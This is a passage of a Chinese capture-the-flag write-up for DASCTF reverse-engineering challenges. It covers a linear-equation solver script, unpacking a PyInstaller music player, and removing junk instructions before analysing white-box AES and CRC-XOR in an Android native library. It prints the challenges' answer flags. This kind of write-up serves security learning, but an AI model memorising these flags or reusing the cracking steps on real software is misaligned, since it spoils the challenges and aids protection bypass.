class="keyword">return</span> solutions</span><br><span class="line"></span><br><span class="line">groups = [</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">173</span>, <span class="number">48</span>, <span class="number">118</span>, <span class="number">193</span>], <span class="number">66131</span>), ([<span class="number">68</span>, <span class="number">196</span>, <span class="number">104</span>, <span class="number">10</span>], <span class="number">52620</span>),</span><br><span class="line">                   ([<span class="number">22</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">71</span>], <span class="number">36011</span>), ([<span class="number">89</span>, <span class="number">141</span>, <span class="number">59</span>, <span class="number">194</span>], <span class="number">61842</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">40</span>, <span class="number">88</span>, <span class="number">175</span>, <span class="number">89</span>], <span class="number">65258</span>), ([<span class="number">82</span>, <span class="number">166</span>, <span class="number">26</span>, <span class="number">78</span>], <span class="number">58176</span>),</span><br><span class="line">                   ([<span class="number">73</span>, <span class="number">10</span>, <span class="number">149</span>, <span class="number">116</span>], <span class="number">62478</span>), ([<span class="number">198</span>, <span class="number">80</span>, <span class="number">176</span>, <span class="number">193</span>], <span class="number">114069</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">83</span>, <span class="number">100</span>, <span class="number">178</span>, <span class="number">30</span>], <span class="number">56170</span>), ([<span class="number">148</span>, <span class="number">148</span>, <span class="number">143</span>, <span class="number">168</span>], <span class="number">70647</span>),</span><br><span class="line">                   ([<span class="number">33</span>, <span class="number">194</span>, <span class="number">10</span>, <span class="number">186</span>], <span class="number">53174</span>), ([<span class="number">128</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">152</span>], <span class="number">26118</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">164</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">29</span>], <span class="number">81254</span>), ([<span class="number">35</span>, <span class="number">129</span>, <span class="number">129</span>, <span class="number">165</span>], <span class="number">78646</span>),</span><br><span class="line">                   ([<span class="number">54</span>, <span class="number">134</span>, <span class="number">39</span>, <span class="number">18</span>], <span class="number">29827</span>), ([<span class="number">80</span>, <span class="number">133</span>, <span class="number">106</span>, <span class="number">43</span>], <span class="number">53660</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">187</span>, <span class="number">32</span>, <span class="number">121</span>, <span class="number">2</span>], <span class="number">24667</span>), ([<span class="number">66</span>, <span class="number">170</span>, <span class="number">58</span>, <span class="number">36</span>], <span class="number">44188</span>),</span><br><span class="line">                   ([<span class="number">103</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">175</span>], <span class="number">52310</span>), ([<span class="number">83</span>, <span class="number">92</span>, <span class="number">129</span>, <span class="number">143</span>], <span class="number">46020</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">100</span>, <span class="number">54</span>, <span class="number">141</span>, <span class="number">122</span>], <span class="number">66732</span>), ([<span class="number">171</span>, <span class="number">85</span>, <span class="number">69</span>, <span class="number">7</span>], <span class="number">46817</span>),</span><br><span class="line">                   ([<span class="number">197</span>, <span class="number">48</span>, <span class="number">128</span>, <span class="number">132</span>], <span class="number">83536</span>), ([<span class="number">101</span>, <span class="number">181</span>, <span class="number">79</span>, <span class="number">144</span>], <span class="number">80587</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">149</span>, <span class="number">187</span>, <span class="number">24</span>, <span class="number">142</span>], <span class="number">92687</span>), ([<span class="number">118</span>, <span class="number">86</span>, <span class="number">49</span>, <span class="number">50</span>], <span class="number">49285</span>),</span><br><span class="line">                   ([<span class="number">70</span>, <span class="number">170</span>, <span class="number">164</span>, <span class="number">193</span>], <span class="number">92711</span>), ([<span class="number">96</span>, <span class="number">198</span>, <span class="number">95</span>, <span class="number">1</span>], <span class="number">61904</span>)]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;equations&#x27;</span>: [([<span class="number">114</span>, <span class="number">179</span>, <span class="number">37</span>, <span class="number">163</span>], <span class="number">53864</span>), ([<span class="number">49</span>, <span class="number">94</span>, <span class="number">132</span>, <span class="number">99</span>], <span class="number">36980</span>),</span><br><span class="line">                   ([<span class="number">1</span>, <span class="number">139</span>, <span class="number">115</span>, <span class="number">44</span>], <span class="number">22448</span>), ([<span class="number">43</span>, <span class="number">113</span>, <span class="number">150</span>, <span class="number">128</span>], <span class="number">40829</span>)]&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_solutions = []</span><br><span class="line"><span class="keyword">for</span> i, group <span class="keyword">in</span> <span class="built_in">enumerate</span>(groups):</span><br><span class="line">    sols = solve_group(i, group[<span class="string">&#x27;equations&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sols:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第 <span class="subst">&#123;i&#125;</span> 组无解&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第 <span class="subst">&#123;i&#125;</span> 组找到 <span class="subst">&#123;<span class="built_in">len</span>(sols)&#125;</span> 个解&quot;</span>)</span><br><span class="line">    all_solutions.append(sols)</span><br><span class="line"></span><br><span class="line">full_solutions = <span class="built_in">list</span>(itertools.product(*all_solutions))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n总共组合出 <span class="subst">&#123;<span class="built_in">len</span>(full_solutions)&#125;</span> 个完整解&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, sol <span class="keyword">in</span> <span class="built_in">enumerate</span>(full_solutions, <span class="number">1</span>):</span><br><span class="line">    flat = [v <span class="keyword">for</span> group <span class="keyword">in</span> sol <span class="keyword">for</span> v <span class="keyword">in</span> group]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n解 <span class="subst">&#123;idx&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        line = <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;flat[j]:3d&#125;</span>&quot;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + <span class="number">8</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    hex_line = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;b:02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> flat)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hex_line&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到：1d7fea8e9b8991f350e69118d732b3fc49c12679a87162f6a1d42dc5e43b5956</p>
<p><img src="./18193d0b-9fd9-4ec0-97e1-a2cd1c284fc3.png" alt="img"></p>
<p>猜测是真正的密文，尝试解密</p>
<p><img src="./52464938-efca-4ecb-926e-459e1644ac83.png" alt="img"></p>
<p>解得flag，flag为：DASCTF{9d78b5507187421a48de8f6ef24a8d4b}</p>
<h2><span id="yu-yin-le">鱼音乐</span><a href="#yu-yin-le" class="header-anchor"></a></h2><p>exe很明显pyinstaller打包的，解包找到main.pyc和xianyu_decrypt.cp38-win_amd64.pyd，pylingual反编译pyc可知是python3.8</p>
<p>核心代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">info = load_and_decrypt_xianyu(file_path)</span><br><span class="line">meta = info[<span class="string">&#x27;meta&#x27;</span>]</span><br><span class="line">cover_path = info[<span class="string">&#x27;cover_path&#x27;</span>]</span><br><span class="line">audio_path = info[<span class="string">&#x27;audio_path&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> cover_path <span class="keyword">and</span> os.path.exists(cover_path):</span><br><span class="line">    pixmap = QPixmap(cover_path)</span><br><span class="line">    <span class="variable language_">self</span>.cover_label.setPixmap(pixmap)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="variable language_">self</span>.cover_label.setText(<span class="string">&#x27;无封面&#x27;</span>)</span><br><span class="line">url = QUrl.fromLocalFile(audio_path)</span><br><span class="line"><span class="variable language_">self</span>.player.setMedia(QMediaContent(url))</span><br><span class="line"><span class="variable language_">self</span>.player.play()</span><br><span class="line">name = meta.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;未知&#x27;</span>)</span><br><span class="line">artist = meta.get(<span class="string">&#x27;artist&#x27;</span>, <span class="string">&#x27;未知歌手&#x27;</span>)</span><br><span class="line">fl4g = meta.get(<span class="string">&#x27;fl4g&#x27;</span>, <span class="string">&#x27;where_is_the_flag?&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>把pyd拿过来和main、xianyu后缀文件放同一目录动态调试即可得到flag</p>
<p><img src="./e96f1a83-4c5a-4528-ae97-133dfd00956b.png" alt="img"></p>
<p>flag是DASCTF{fl5h_mus1c_miao_m1a0_mlaO}</p>
<h2><span id="geng-gua-he-ctf-bao-bao-ti-zhi-de-app">更适合CTF宝宝体质的app</span><a href="#geng-gua-he-ctf-bao-bao-ti-zhi-de-app" class="header-anchor"></a></h2><p>java层是假的flag（tea加密）</p>
<p>so层分析后发现还是arm好读，里面有几个函数开头有花指令</p>
<p><img src="./ade9d6f8-05b9-45bf-95f7-111d4196fdfb.png" alt="img"></p>
<p>分析可以发现在跳转BR X8后的代码反汇编失败，分析X8值，首先是X8&#x3D;(1^0xAB^0xC7)-0x6C&#x3D;1，然后X8&#x3D;X9+X12*X8&#x3D;0x4028+0x14&#x3D;0x403C，所以实际上实现了一个计算跳转地址，中间所有的都是花指令，直接IDA nop即可</p>
<p>去花后可以反编译，根据JNI_OnLoad找到Check函数如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">sub_3A9C</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// [xsp+3Ch] [xbp-144h]</span></span><br><span class="line">  _OWORD v4[<span class="number">2</span>]; <span class="comment">// [xsp+40h] [xbp-140h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">64</span>]; <span class="comment">// [xsp+60h] [xbp-120h] BYREF</span></span><br><span class="line">  _OWORD s1[<span class="number">2</span>]; <span class="comment">// [xsp+150h] [xbp-30h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [xsp+178h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = *(_ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  s1[<span class="number">1</span>] = xmmword_D84;</span><br><span class="line">  s1[<span class="number">0</span>] = xmmword_D74;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">sub_3FD0</span>(a1, v5);</span><br><span class="line">  <span class="built_in">sub_3FD0</span>(a1 + <span class="number">16</span>, &amp;v5[<span class="number">16</span>]);</span><br><span class="line">  <span class="built_in">sub_37F0</span>(v5, v4, <span class="number">0x20uLL</span>, <span class="number">0x6C6F7665</span>);</span><br><span class="line">  v3 = <span class="built_in">memcmp</span>(s1, v4, <span class="number">0x20uLL</span>) == <span class="number">0</span>;</span><br><span class="line">  _ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_3FD0</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v17 = *(_ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="built_in">sizeof</span>(v16));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="built_in">sizeof</span>(v15));</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  __memcpy_chk(v16, &amp;unk_6FA4, <span class="number">163840LL</span>, <span class="number">163840LL</span>);</span><br><span class="line">  __memcpy_chk(v15, &amp;unk_2EFA4, <span class="number">4096LL</span>, <span class="number">4096LL</span>);</span><br><span class="line">  __memcpy_chk(s, &amp;unk_2FFA4, <span class="number">221184LL</span>, <span class="number">221184LL</span>);</span><br><span class="line">  __memcpy_chk(v13, a1, <span class="number">16LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">shift</span>(v13);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *&amp;v16[<span class="number">0x4000</span> * i + <span class="number">1024</span> * (<span class="number">4</span> * j) + <span class="number">4</span> * v13[<span class="number">4</span> * j]];</span><br><span class="line">      v7 = *&amp;v16[<span class="number">0x4000</span> * i + <span class="number">1024</span> * ((<span class="number">4</span> * j) | <span class="number">1</span>) + <span class="number">4</span> * v13[(<span class="number">4</span> * j) | <span class="number">1</span>]];</span><br><span class="line">      v6 = *&amp;v16[<span class="number">0x4000</span> * i + <span class="number">1024</span> * ((<span class="number">4</span> * j) | <span class="number">2</span>) + <span class="number">4</span> * v13[(<span class="number">4</span> * j) | <span class="number">2</span>]];</span><br><span class="line">      v5 = *&amp;v16[<span class="number">0x4000</span> * i + <span class="number">1024</span> * ((<span class="number">4</span> * j) | <span class="number">3</span>) + <span class="number">4</span> * v13[(<span class="number">4</span> * j) | <span class="number">3</span>]];</span><br><span class="line">      v4 = <span class="number">24</span> * j;</span><br><span class="line">      v13[<span class="number">4</span> * j] = *(&amp;s[<span class="number">1536</span> * i</span><br><span class="line">                      + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">5</span>)</span><br><span class="line">                      + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">2</span>) + (<span class="built_in">HIBYTE</span>(v8) &amp; <span class="number">0xF</span>)] + (<span class="built_in">HIBYTE</span>(v7) &amp; <span class="number">0xF</span>))]</span><br><span class="line">                   + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">3</span>) + (<span class="built_in">HIBYTE</span>(v6) &amp; <span class="number">0xF</span>)] + (<span class="built_in">HIBYTE</span>(v5) &amp; <span class="number">0xF</span>))) | (<span class="number">16</span> * *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">4</span>) + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j) + (v8 &gt;&gt; <span class="number">28</span>)] + (v7 &gt;&gt; <span class="number">28</span>))] + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">1</span>) + (v6 &gt;&gt; <span class="number">28</span>)] + (v5 &gt;&gt; <span class="number">28</span>))));</span><br><span class="line">      v13[(<span class="number">4</span> * j) | <span class="number">1</span>] = *(&amp;s[<span class="number">1536</span> * i</span><br><span class="line">                            + <span class="number">16</span> * (v4 + <span class="number">11</span>)</span><br><span class="line">                            + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">8</span>) + (<span class="built_in">BYTE2</span>(v8) &amp; <span class="number">0xF</span>)] + (<span class="built_in">BYTE2</span>(v7) &amp; <span class="number">0xF</span>))]</span><br><span class="line">                         + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">9</span>) + (<span class="built_in">BYTE2</span>(v6) &amp; <span class="number">0xF</span>)] + (<span class="built_in">BYTE2</span>(v5) &amp; <span class="number">0xF</span>))) | (<span class="number">16</span> * *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (v4 + <span class="number">10</span>) + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">6</span>) + ((v8 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>)] + ((v7 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>))] + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">7</span>) + ((v6 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>)] + ((v5 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>))));</span><br><span class="line">      v13[(<span class="number">4</span> * j) | <span class="number">2</span>] = *(&amp;s[<span class="number">1536</span> * i</span><br><span class="line">                            + <span class="number">16</span> * (v4 + <span class="number">17</span>)</span><br><span class="line">                            + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">14</span>) + ((v8 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>)] + ((v7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>))]</span><br><span class="line">                         + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">15</span>) + ((v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>)] + ((v5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>))) | (<span class="number">16</span> * *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (v4 + <span class="number">16</span>) + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">12</span>) + (v8 &gt;&gt; <span class="number">12</span>)] + (v7 &gt;&gt; <span class="number">12</span>))] + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">13</span>) + (v6 &gt;&gt; <span class="number">12</span>)] + (v5 &gt;&gt; <span class="number">12</span>))));</span><br><span class="line">      v13[(<span class="number">4</span> * j) | <span class="number">3</span>] = *(&amp;s[<span class="number">1536</span> * i</span><br><span class="line">                            + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">23</span>)</span><br><span class="line">                            + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">20</span>) + (v8 &amp; <span class="number">0xF</span>)] + (v7 &amp; <span class="number">0xF</span>))]</span><br><span class="line">                         + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">21</span>) + (v6 &amp; <span class="number">0xF</span>)] + (v5 &amp; <span class="number">0xF</span>))) | (<span class="number">16</span></span><br><span class="line">                                                                                            * *(&amp;s[<span class="number">1536</span> * i</span><br><span class="line">                                                                                                 + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">22</span>)</span><br><span class="line">                                                                                                 + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">18</span>) + (v8 &gt;&gt; <span class="number">4</span>)] + (v7 &gt;&gt; <span class="number">4</span>))]</span><br><span class="line">                                                                                              + *(&amp;s[<span class="number">1536</span> * i + <span class="number">16</span> * (<span class="number">24</span> * j + <span class="number">19</span>) + (v6 &gt;&gt; <span class="number">4</span>)]</span><br><span class="line">                                                                                                + (v5 &gt;&gt; <span class="number">4</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">shift</span>(v13);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">    *(a2 + k) = v15[<span class="number">256</span> * k + v13[k]];</span><br><span class="line">  _ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_37F0</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [xsp+8h] [xbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [xsp+34h] [xbp-Ch] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+38h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = *(_ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  v9 = a4;</span><br><span class="line">  result = <span class="built_in">sub_3750</span>(&amp;v9, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a3; ++i )</span><br><span class="line">    *(a2 + i) = *(a1 + i) ^ (result &gt;&gt; (<span class="number">8</span> * (i &amp; <span class="number">3</span>)));</span><br><span class="line">  _ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_3750</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [xsp+10h] [xbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [xsp+1Ch] [xbp-14h]</span></span><br><span class="line"></span><br><span class="line">  (loc_3678)();</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a2; ++i )</span><br><span class="line">    v4 = dword_65FB8[(v4 ^ *(a1 + i))] ^ (v4 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Java_com_example_test_MainActivity_Get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [xsp+4h] [xbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [xsp+8h] [xbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+Ch] [xbp-24h]</span></span><br><span class="line"></span><br><span class="line">  __break(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_65FB4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = i;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          v1 = (v1 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      dword_65FB8[i] = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_65FB4 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知s1是密文，sub_3FD0是白盒AES（很大的查表操作），sub_37F0是带有crc的异或加密</p>
<p>首先分析crc加密，使用了dword_65FB8来查表计算，交叉引用发现在Java_com_example_test_MainActivity_Get进行了初始化，可以直接模拟逻辑生成。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init_crc_table</span>():</span><br><span class="line">    crc_table = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x = i</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                x = (x &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span></span><br><span class="line">            <span 